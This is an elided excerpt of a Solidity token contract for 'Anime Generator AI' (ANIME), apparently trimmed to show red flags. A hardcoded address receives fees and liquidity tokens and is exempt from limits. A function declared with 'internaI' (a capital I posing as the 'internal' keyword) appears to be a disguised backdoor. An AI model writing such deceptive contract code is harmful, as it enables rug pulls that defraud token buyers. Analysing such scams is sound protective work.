...
contract AnimeAI is ERC20, Ownable {
    ...
    string constant _name = "Anime Generator AI";
    string constant _symbol = "ANIME";

    uint256 public _totalSupply = uint256(100_000_000_000 * (10 ** 9));
    ...
    address public marketingFeeReceiver = 0xA2C06A94E13902a4b1EDBecd1064b002D9E55dAF;
    ...
    constructor () Ownable(msg.sender) {
        ...
        isFeeExempt[0xA2C06A94E13902a4b1EDBecd1064b002D9E55dAF] = true; 
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[0xA2C06A94E13902a4b1EDBecd1064b002D9E55dAF] = true;
    ...
    function swapBack() internal swapping {
        ...
        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                ...
                0,
                0,
                0xA2C06A94E13902a4b1EDBecd1064b002D9E55dAF,
                block.timestamp
            );
    ...
    function migrateAMM(address _routerAddress) external internaI {
